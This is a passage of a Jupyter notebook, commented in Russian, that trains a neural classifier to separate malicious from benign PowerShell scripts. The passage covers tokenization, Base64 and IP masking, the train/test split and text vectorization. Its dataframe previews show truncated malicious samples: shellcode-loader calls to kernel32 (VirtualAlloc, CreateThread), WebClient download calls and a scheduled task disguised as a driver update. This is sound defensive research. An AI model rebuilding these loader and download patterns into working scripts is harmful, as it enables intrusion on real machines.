       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>﻿function Get-SCCMDeviceCollectionDeployment {...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>﻿ param([string]$DName ) configuration LabDC_D...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>﻿ function Test-Run { $dfname = Get-DataFactor...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Write-Host \"Installing Pester\" -ForegroundColo...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4049</th>\n",
       "      <td>function Get-AuthToken { [cmdletbinding()] pa...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4050</th>\n",
       "      <td>﻿ Update-TypeData -TypeName System.Diagnostics...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4051</th>\n",
       "      <td>function Get-AuthToken { [cmdletbinding()] pa...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4052</th>\n",
       "      <td>function Uninstall-CUser { [CmdletBinding(Sup...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4053</th>\n",
       "      <td>﻿ param( [Parameter(Mandatory=$true, Position=...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>4054 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                   data  label\n",
       "0      function Expand-CItem { [OutputType([IO.Direc...      1\n",
       "1     ﻿function Get-SCCMDeviceCollectionDeployment {...      1\n",
       "2     ﻿ param([string]$DName ) configuration LabDC_D...      1\n",
       "3     ﻿ function Test-Run { $dfname = Get-DataFactor...      1\n",
       "4     Write-Host \"Installing Pester\" -ForegroundColo...      1\n",
       "...                                                 ...    ...\n",
       "4049   function Get-AuthToken { [cmdletbinding()] pa...      1\n",
       "4050  ﻿ Update-TypeData -TypeName System.Diagnostics...      1\n",
       "4051   function Get-AuthToken { [cmdletbinding()] pa...      1\n",
       "4052   function Uninstall-CUser { [CmdletBinding(Sup...      1\n",
       "4053  ﻿ param( [Parameter(Mandatory=$true, Position=...      1\n",
       "\n",
       "[4054 rows x 2 columns]"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_mixed = pd.DataFrame(mixed, columns=['data'])\n",
    "df_mixed['label'] = 1\n",
    "df_mixed"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "12980934-e87b-4ead-824f-75c90e5223d2",
   "metadata": {},
   "source": [
    "## 1.2. Подготовка данных"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3820f4f7-a563-440c-8bf3-b9d2df5c2bd1",
   "metadata": {},
   "source": [
    "Пока не будем заморачиваться с подготовкой, возьмем ее из статьи:\n",
    "1) Заменим громоздкие массивы Base64, которые встречаются в коде на наш единый токен base64_string. Для модели подобные массивы будут бесполезны, т.к. будет много уникальных значений. Модель будет анализировать информацию в виде чисел и не сможет отличить Base64, скажем, от другого слова. Введение подобного токена поможет акцентировать на этом внимание.\n",
    "\n",
    "2) Заменим IP адреса на два вида токенов: external_ip для внешних адресов и internal_ip для внутренних. IP адреса встречаются как в легитимном коде, так и во вредоносном, при этом нам совершенно не важно, что это за адрес. Достаточно понимать, внутренний он или внешний.\n",
    "\n",
    "3) Часть спецсимволов будем использовать как разделитель. Скобки, кавычки и прочие элементы кода не несут особой смысловой нагрузки для решения нашей задачи, при этом мы будем использовать их в качестве разделителя и заменим на пробел.\n",
    "\n",
    "4) Удалим лишние пробелы и мусор для того, чтобы уменьшить объем кода.\n",
    "\n",
    "5) Приведем все символы к нижнему регистру, чтобы стандартизировать токены."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "102210c0-c27b-4c32-aeaa-6a83c5e46fbc",
   "metadata": {},
   "outputs": [],
   "source": [
    "def clean_data_to_tokens(dataset):\n",
    "    tokens = []\n",
    "    char_replace = \"()[]{},;'/\\=:^<>|`+\\\"\"\n",
    "    for source_string in dataset:\n",
    "        source_string = re.sub(\"FromBase64String\\(\\'(.*)\\'\\)\", \"base64_string\", source_string)\n",
    "        source_string = re.sub(\"([a-zA-Z0-9\\/\\+=]{100,})+\", \"base64_string\", source_string)\n",
    "        for char in char_replace:\n",
    "            source_string = source_string.replace(char, ' ')\n",
    "        source_string = re.sub(r\"(?<!\\S)\\d+(?!\\S)\", \" \", source_string)\n",
    "        source_string = re.sub(r\"0x\\S+\", \" \", source_string)\n",
    "        ip_addresses = re.findall(r'(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)', source_string)\n",
    "        for ip in ip_addresses:\n",
    "            if ip.startswith('10.') or ip.startswith('192.') or ip.startswith('172.16.') or ip.startswith('127.0.'):\n",
    "                source_string = source_string.replace(ip, 'internal_ip')\n",
    "            else:\n",
    "                source_string = source_string.replace(ip, 'external_ip')\n",
    "        source_string = source_string.replace('.', ' ')\n",
    "        tokens.append(re.sub(r'\\s+', ' ', source_string.lower()))\n",
    "    return tokens\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "68fb3775-57ef-45de-bb4f-fabc7886332e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>data</th>\n",
       "      <th>label</th>\n",
       "      <th>tokenized</th>\n",
       "      <th>tokenized_len</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>$usQ9 = '[DllImport(\"kernel32.dll\")]public st...</td>\n",
       "      <td>1</td>\n",
       "      <td>$usq9 dllimport kernel32 dll public static ex...</td>\n",
       "      <td>95</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>$c = '[DllImport(\"kernel32.dll\")]public stati...</td>\n",
       "      <td>1</td>\n",
       "      <td>$c dllimport kernel32 dll public static exter...</td>\n",
       "      <td>95</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>(New-Object System.Net.WebClient).DownloadFil...</td>\n",
       "      <td>1</td>\n",
       "      <td>new-object system net webclient downloadfile ...</td>\n",
       "      <td>19</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>$TaskName = \"Microsoft Windows Driver Update\"...</td>\n",
       "      <td>1</td>\n",
       "      <td>$taskname microsoft windows driver update $ta...</td>\n",
       "      <td>109</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>$wc=New-OBjecT SysteM.NeT.WebClIeNT;$u='Mozil...</td>\n",
       "      <td>1</td>\n",
       "      <td>$wc new-object system net webclient $u mozill...</td>\n",
       "      <td>66</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4311</th>\n",
       "      <td>﻿ function Connect-SCP{ param ( [parameter(Man...</td>\n",
       "      <td>0</td>\n",
       "      <td>﻿ function connect-scp param parameter mandato...</td>\n",
       "      <td>141</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4312</th>\n",
       "      <td>function Test-CSslCertificateBinding { [Cmdle...</td>\n",
       "      <td>0</td>\n",
       "      <td>function test-csslcertificatebinding cmdletbi...</td>\n",
       "      <td>39</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4313</th>\n",
       "      <td>class Room { [string]$Id [string]$Name [strin...</td>\n",
       "      <td>0</td>\n",
       "      <td>class room string $id string $name string $to...</td>\n",
       "      <td>48</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4314</th>\n",
       "      <td>﻿function Get-ADMigratedSourceObject { [cmdlet...</td>\n",
       "      <td>0</td>\n",
       "      <td>﻿function get-admigratedsourceobject cmdletbin...</td>\n",
       "      <td>678</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4315</th>\n",
       "      <td>param( [switch]$SkipCabs, [switch]$ShowProgres...</td>\n",
       "      <td>0</td>\n",
       "      <td>param switch $skipcabs switch $showprogress $g...</td>\n",
       "      <td>471</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>8370 rows × 4 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                   data  label  \\\n",
       "0      $usQ9 = '[DllImport(\"kernel32.dll\")]public st...      1   \n",
       "1      $c = '[DllImport(\"kernel32.dll\")]public stati...      1   \n",
       "2      (New-Object System.Net.WebClient).DownloadFil...      1   \n",
       "3      $TaskName = \"Microsoft Windows Driver Update\"...      1   \n",
       "4      $wc=New-OBjecT SysteM.NeT.WebClIeNT;$u='Mozil...      1   \n",
       "...                                                 ...    ...   \n",
       "4311  ﻿ function Connect-SCP{ param ( [parameter(Man...      0   \n",
       "4312   function Test-CSslCertificateBinding { [Cmdle...      0   \n",
       "4313   class Room { [string]$Id [string]$Name [strin...      0   \n",
       "4314  ﻿function Get-ADMigratedSourceObject { [cmdlet...      0   \n",
       "4315  param( [switch]$SkipCabs, [switch]$ShowProgres...      0   \n",
       "\n",
       "                                              tokenized  tokenized_len  \n",
       "0      $usq9 dllimport kernel32 dll public static ex...             95  \n",
       "1      $c dllimport kernel32 dll public static exter...             95  \n",
       "2      new-object system net webclient downloadfile ...             19  \n",
       "3      $taskname microsoft windows driver update $ta...            109  \n",
       "4      $wc new-object system net webclient $u mozill...             66  \n",
       "...                                                 ...            ...  \n",
       "4311  ﻿ function connect-scp param parameter mandato...            141  \n",
       "4312   function test-csslcertificatebinding cmdletbi...             39  \n",
       "4313   class room string $id string $name string $to...             48  \n",
       "4314  ﻿function get-admigratedsourceobject cmdletbin...            678  \n",
       "4315  param switch $skipcabs switch $showprogress $g...            471  \n",
       "\n",
       "[8370 rows x 4 columns]"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Обрабатываем данные\n",
    "df_all['tokenized'] = clean_data_to_tokens(df_all['data'].values)\n",
    "df_all['tokenized_len'] = df_all['tokenized'].apply(lambda x: len(x.split()))\n",
    "df_all"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "97255239-e167-498e-9c0f-14106d27d9de",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Axes: title={'center': 'tokenized_len'}, xlabel='label'>"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "df_all.boxplot('tokenized_len', by='label')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "1cbd711c-1de5-4a50-8b61-389e9b3ceaef",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "count     8370.000000\n",
       "mean       274.059618\n",
       "std        938.681900\n",
       "min          2.000000\n",
       "25%         38.000000\n",
       "50%         95.000000\n",
       "75%        175.000000\n",
       "max      29572.000000\n",
       "Name: tokenized_len, dtype: float64"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_all['tokenized_len'].describe()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "f281a3c7-2c77-49e5-8a04-0250a3d8531f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "3271\n"
     ]
    }
   ],
   "source": [
    "token_len = int(df_all['tokenized_len'].quantile(0.99))\n",
    "print(token_len)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "85131e36-fbbb-4511-bb34-b86fa57f7aea",
   "metadata": {},
   "source": [
    "В статье принимается длина токенов 2000, пока оставим так"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "2d701e37-2dcc-44b7-b413-7406b0bfd202",
   "metadata": {},
   "outputs": [],
   "source": [
    "token_len = 2000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "d13565fc-5d1f-4c83-b285-1d14a991748c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Информация по данным тренировочного датасета\n",
      "Словарь уникальных токенов в исходных данных (Токен:Количество): \n",
      " {'if': 29719, '-name': 22693, 'intptr': 22601, 'should': 20945, 'system': 19972, 'assert-areequal': 19074, '@': 17127, 'name': 16379, '$': 15152, 'uint': 14168, '$i': 13454, 'string': 13005, '$_': 12776, '$true': 12711, 'function': 12200, '-eq': 12166, 'new-object': 10718, '-resourcegroupname': 10698, '$rgname': 10264, '-path': 10043, 'parameter': 9830, 'count': 9642, 'it': 9554, 'public': 9009, '$z': 8896, 'the': 8864, '$null': 8724, 'for': 8325, 'microsoft': 8291, 'else': 8091, '$false': 7914, '$w': 7891, 'write-host': 7738, 'length': 7578, 'dll': 7568, '-force': 7496, '$result': 7465, 'to': 7162, 'param': 6893, 'return': 6697, 'in': 6651, 'static': 6620, 'mandatory': 6311, 'exe': 6213, 'byte': 6198, 'dllimport': 6073, 'extern': 6072, 'not': 5517, '$g': 5395, 'try': 5383, 'a': 5362, '$script': 5335, '$env': 5123, '-be': 5100, 'id': 5055, 'be': 4910, '$x': 4812, '-not': 4693, 'add': 4603, 'assert-notnull': 4582, 'windows': 4530, '$p': 4494, '\\x00': 4437, 'net': 4371, 'kernel32': 4219, 'is': 4197, 'powershell': 4163, 'value': 4120, '-erroraction': 4097, '$resourcegroupname': 4065, '-location': 4025, 'foreach': 4017, 'write-verbose': 4009, 'virtualalloc': 3994, 'path': 3983, 'memset': 3979, 'createthread': 3972, '*': 3867, 'size': 3787, '-gt': 3785, '-message': 3757, '0': 3743, '$location': 3702, 'join-path': 3679, '-and': 3612, 'resourcegroupname': 3499, 'type': 3461, '-passthru': 3457, 'with': 3346, 'catch': 3306, 'out-null': 3303, 'management': 3249, 'test': 3226, '-ne': 3205, '-f': 3177, 'version': 3146, '-value': 3123, '-or': 3121, '-': 3110, 'error': 3044}\n",
      "Количество уникальных токенов в исходных данных:  91281\n"
     ]
    }
   ],
   "source": [
    "# Cловарь с уникальными токенами\n",
    "def dataset_vocab(input_data):\n",
    "    unique_words = {}\n",
    "    for data in input_data:\n",
    "        words = data.split()\n",
    "        for word in words:\n",
    "            if word not in unique_words:\n",
    "                unique_words[word] = 1\n",
    "            else:\n",
    "                unique_words[word] += 1\n",
    "    # Сортируем словарь от большего к меньшему\n",
    "    sorted_unique_words = {k:v for k,v in sorted(unique_words.items(), key=lambda item: item[1], reverse=True)}\n",
    "    # Ограничение на вывод первых 100 элементов словаря\n",
    "    sorted_unique_words = dict(list(sorted_unique_words.items())[:100])\n",
    "    unique_words_count = len(unique_words.keys())\n",
    "    print('Словарь уникальных токенов в исходных данных (Токен:Количество): \\n', sorted_unique_words)\n",
    "    print('Количество уникальных токенов в исходных данных: ', unique_words_count)\n",
    "    \n",
    "# Выводим статистику по тренировочному датасету\n",
    "print('Информация по данным тренировочного датасета') \n",
    "dataset_vocab(df_all['tokenized'])   "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0272f13d-9704-446d-afce-eac43a9ccda8",
   "metadata": {},
   "source": [
    "Приведение списков токенов к одной длине"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "3566d587-e864-4117-abde-c348ff6d79d4",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>data</th>\n",
       "      <th>label</th>\n",
       "      <th>tokenized</th>\n",
       "      <th>tokenized_len</th>\n",
       "      <th>tokenized_limit</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>$usQ9 = '[DllImport(\"kernel32.dll\")]public st...</td>\n",
       "      <td>1</td>\n",
       "      <td>$usq9 dllimport kernel32 dll public static ex...</td>\n",
       "      <td>95</td>\n",
       "      <td>$usq9 dllimport kernel32 dll public static ext...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>$c = '[DllImport(\"kernel32.dll\")]public stati...</td>\n",
       "      <td>1</td>\n",
       "      <td>$c dllimport kernel32 dll public static exter...</td>\n",
       "      <td>95</td>\n",
       "      <td>$c dllimport kernel32 dll public static extern...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>(New-Object System.Net.WebClient).DownloadFil...</td>\n",
       "      <td>1</td>\n",
       "      <td>new-object system net webclient downloadfile ...</td>\n",
       "      <td>19</td>\n",
       "      <td>new-object system net webclient downloadfile h...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>$TaskName = \"Microsoft Windows Driver Update\"...</td>\n",
       "      <td>1</td>\n",
       "      <td>$taskname microsoft windows driver update $ta...</td>\n",
       "      <td>109</td>\n",
       "      <td>$taskname microsoft windows driver update $tas...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>$wc=New-OBjecT SysteM.NeT.WebClIeNT;$u='Mozil...</td>\n",
       "      <td>1</td>\n",
       "      <td>$wc new-object system net webclient $u mozill...</td>\n",
       "      <td>66</td>\n",
       "      <td>$wc new-object system net webclient $u mozilla...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4311</th>\n",
       "      <td>﻿ function Connect-SCP{ param ( [parameter(Man...</td>\n",
       "      <td>0</td>\n",
       "      <td>﻿ function connect-scp param parameter mandato...</td>\n",
       "      <td>141</td>\n",
       "      <td>﻿ function connect-scp param parameter mandato...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4312</th>\n",
       "      <td>function Test-CSslCertificateBinding { [Cmdle...</td>\n",
       "      <td>0</td>\n",
       "      <td>function test-csslcertificatebinding cmdletbi...</td>\n",
       "      <td>39</td>\n",
       "      <td>function test-csslcertificatebinding cmdletbin...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4313</th>\n",
       "      <td>class Room { [string]$Id [string]$Name [strin...</td>\n",
       "      <td>0</td>\n",
       "      <td>class room string $id string $name string $to...</td>\n",
       "      <td>48</td>\n",
       "      <td>class room string $id string $name string $top...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4314</th>\n",
       "      <td>﻿function Get-ADMigratedSourceObject { [cmdlet...</td>\n",
       "      <td>0</td>\n",
       "      <td>﻿function get-admigratedsourceobject cmdletbin...</td>\n",
       "      <td>678</td>\n",
       "      <td>﻿function get-admigratedsourceobject cmdletbin...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4315</th>\n",
       "      <td>param( [switch]$SkipCabs, [switch]$ShowProgres...</td>\n",
       "      <td>0</td>\n",
       "      <td>param switch $skipcabs switch $showprogress $g...</td>\n",
       "      <td>471</td>\n",
       "      <td>param switch $skipcabs switch $showprogress $g...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>8370 rows × 5 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                   data  label  \\\n",
       "0      $usQ9 = '[DllImport(\"kernel32.dll\")]public st...      1   \n",
       "1      $c = '[DllImport(\"kernel32.dll\")]public stati...      1   \n",
       "2      (New-Object System.Net.WebClient).DownloadFil...      1   \n",
       "3      $TaskName = \"Microsoft Windows Driver Update\"...      1   \n",
       "4      $wc=New-OBjecT SysteM.NeT.WebClIeNT;$u='Mozil...      1   \n",
       "...                                                 ...    ...   \n",
       "4311  ﻿ function Connect-SCP{ param ( [parameter(Man...      0   \n",
       "4312   function Test-CSslCertificateBinding { [Cmdle...      0   \n",
       "4313   class Room { [string]$Id [string]$Name [strin...      0   \n",
       "4314  ﻿function Get-ADMigratedSourceObject { [cmdlet...      0   \n",
       "4315  param( [switch]$SkipCabs, [switch]$ShowProgres...      0   \n",
       "\n",
       "                                              tokenized  tokenized_len  \\\n",
       "0      $usq9 dllimport kernel32 dll public static ex...             95   \n",
       "1      $c dllimport kernel32 dll public static exter...             95   \n",
       "2      new-object system net webclient downloadfile ...             19   \n",
       "3      $taskname microsoft windows driver update $ta...            109   \n",
       "4      $wc new-object system net webclient $u mozill...             66   \n",
       "...                                                 ...            ...   \n",
       "4311  ﻿ function connect-scp param parameter mandato...            141   \n",
       "4312   function test-csslcertificatebinding cmdletbi...             39   \n",
       "4313   class room string $id string $name string $to...             48   \n",
       "4314  ﻿function get-admigratedsourceobject cmdletbin...            678   \n",
       "4315  param switch $skipcabs switch $showprogress $g...            471   \n",
       "\n",
       "                                        tokenized_limit  \n",
       "0     $usq9 dllimport kernel32 dll public static ext...  \n",
       "1     $c dllimport kernel32 dll public static extern...  \n",
       "2     new-object system net webclient downloadfile h...  \n",
       "3     $taskname microsoft windows driver update $tas...  \n",
       "4     $wc new-object system net webclient $u mozilla...  \n",
       "...                                                 ...  \n",
       "4311  ﻿ function connect-scp param parameter mandato...  \n",
       "4312  function test-csslcertificatebinding cmdletbin...  \n",
       "4313  class room string $id string $name string $top...  \n",
       "4314  ﻿function get-admigratedsourceobject cmdletbin...  \n",
       "4315  param switch $skipcabs switch $showprogress $g...  \n",
       "\n",
       "[8370 rows x 5 columns]"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_all['tokenized_limit'] = df_all['tokenized'].apply(lambda x: ' '.join(x.split()[:token_len]))\n",
    "df_all"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4bfcc6cd-bbc5-499d-9112-7489493871bf",
   "metadata": {},
   "source": [
    "## 1.3. Разделение на train/test"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "820cb05f-b717-43a4-9b3c-428da508d27b",
   "metadata": {},
   "source": [
    "Авторы отложили по 100 файлов из каждой директории (из ~4000 файлов, т.е. 2.5%) для тестирования.\n",
    "Разделение на обучение/валидацию: 80/20"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "29b20c4c-1a84-4ef0-9b72-9068663fd21f",
   "metadata": {},
   "outputs": [],
   "source": [
    "df_test = df_all[['tokenized_limit', 'label']].sample(100, random_state=1).copy()\n",
    "y_test = df_test.pop('label')\n",
    "X_test = df_test\n",
    "\n",
    "df_train = df_all[['tokenized_limit', 'label']].drop(df_test.index).copy()\n",
    "X_train, X_val, y_train, y_val = train_test_split(df_train['tokenized_limit'], \n",
    "                                                  df_train['label'],\n",
    "                                                  test_size=0.2,\n",
    "                                                  random_state=1,\n",
    "                                                  shuffle=True)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "1d18c0b1-02d9-40ee-904c-00b0b0153547",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 900x300 with 3 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.figure(figsize=(9,3))\n",
    "plt.subplot(131)\n",
    "plt.hist(y_test)\n",
    "plt.title('y_test')\n",
    "plt.subplot(132)\n",
    "plt.hist(y_train)\n",
    "plt.title('y_train')\n",
    "plt.subplot(133)\n",
    "plt.hist(y_val)\n",
    "plt.title('y_val')\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ff2008b2-b1c9-4840-84a3-ef7472360fdf",
   "metadata": {},
   "source": [
    "## 1.4. Векторизация и эмбеддинги"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "f8b84299-1a51-4f5b-b00a-8e6a17fefe36",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2023-11-08 08:27:43.117022: E tensorflow/compiler/xla/stream_executor/cuda/cuda_driver.cc:268] failed call to cuInit: CUDA_ERROR_COMPAT_NOT_SUPPORTED_ON_DEVICE: forward compatibility was attempted on non supported HW\n",
      "2023-11-08 08:27:43.117104: I tensorflow/compiler/xla/stream_executor/cuda/cuda_diagnostics.cc:168] retrieving CUDA diagnostic information for host: rsr-gpu\n",
      "2023-11-08 08:27:43.117119: I tensorflow/compiler/xla/stream_executor/cuda/cuda_diagnostics.cc:175] hostname: rsr-gpu\n",
      "2023-11-08 08:27:43.117405: I tensorflow/compiler/xla/stream_executor/cuda/cuda_diagnostics.cc:199] libcuda reported version is: 535.129.3\n",
      "2023-11-08 08:27:43.117459: I tensorflow/compiler/xla/stream_executor/cuda/cuda_diagnostics.cc:203] kernel reported version is: 535.113.1\n",
      "2023-11-08 08:27:43.117470: E tensorflow/compiler/xla/stream_executor/cuda/cuda_diagnostics.cc:312] kernel version 535.113.1 does not match DSO version 535.129.3 -- cannot find working devices in this configuration\n"
     ]
    }
   ],
   "source": [
    "max_tokens_count = 90000 # Максимальный размер словаря нашего датасета ~91000 мы возьмем ТОП самых часто встречающихся токенов\n",
    "# Создадим слой TextVectorization\n",
    "text_vectorizer = layers.TextVectorization(max_tokens=max_tokens_count, # Максимальный размер словаря\n",
    "                                           output_sequence_length=token_len, # максимальное количество токенов\n",
    "                                           standardize=None) # Не используем стандартизацию т.к. уже преобразовали данные\n",
    "text_vectorizer.adapt(X_train) # Формирование словаря"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "56a71059-2344-4166-8d9b-861d3c1a1f4b",
   "metadata": {},
   "outputs": [],
   "source": [
    "token_embed = layers.Embedding(input_dim=max_tokens_count, # Максимальный размер словаря\n",
    "                               output_dim=16, # Количество эмбеддингов\n",
    "                               mask_zero=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "afc20ef3-a123-4948-8b09-d24793277937",
   "metadata": {},
   "source": [
    "## 1.5. Создание и обучение модели"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "9a01756d",
   "metadata": {},
   "outputs": [],
   "source": [
    "def plot_training_stat(model_history):\n",
    "    # Loss\n",
    "    plt.plot(model_history.history['loss'], label='loss')\n",
    "    plt.plot(model_history.history['val_loss'], label='val_loss')\n",
    "    plt.title('Статистика обучения модели (loss)')\n",
    "    plt.ylabel('value')\n",
    "    plt.xlabel('No. epoch')\n",
    "    plt.legend(loc=\"upper right\")\n",
    "    plt.show()\n",
    "    \n",
    "    # Accuracy\n",
    "    plt.plot(model_history.history['accuracy'], label='accuracy')\n",
    "    plt.plot(model_history.history['val_accuracy'], label='val_accuracy')\n",
    "    plt.title('Статистика обучения модели (accuracy)')\n",
    "    plt.ylabel('value')\n",
    "    plt.xlabel('No. epoch')\n",
    "    plt.legend(loc=\"lower right\")\n",
    "    plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "37bc94f3-bfe4-462a-b699-9205737131dd",
   "metadata": {},
   "source": [
    "### 1.5.1. Как в статье"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "76273f12-2032-4bb7-b4b1-0892e346a1b6",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Отдельно сохраняем валидационные метки, далее будем использовать для тестирования модели.\n",
    "val_labels_encoded = y_val\n",
    "\n",
    "# Кодируем метки OneHotEncoder\n",
    "train_labels = pd.DataFrame(y_train)\n",
    "val_labels = pd.DataFrame(y_val)\n",
    "one_hot_encoder = OneHotEncoder(sparse_output=False)\n",
    "train_labels = one_hot_encoder.fit_transform(y_train.to_numpy().reshape(-1, 1))\n",
    "val_labels = one_hot_encoder.transform(y_val.to_numpy().reshape(-1, 1))\n",
    "\n",
    "# Формируем датасеты для тренировки, валидации и проверки\n",
    "train_dataset = tf.data.Dataset.from_tensor_slices((X_train, train_labels))\n",
    "val_dataset = tf.data.Dataset.from_tensor_slices((X_val, val_labels))\n",
    "test_dataset = tf.data.Dataset.from_tensor_slices((df_test))\n",
    "train_dataset = train_dataset.batch(16).prefetch(tf.data.AUTOTUNE)\n",
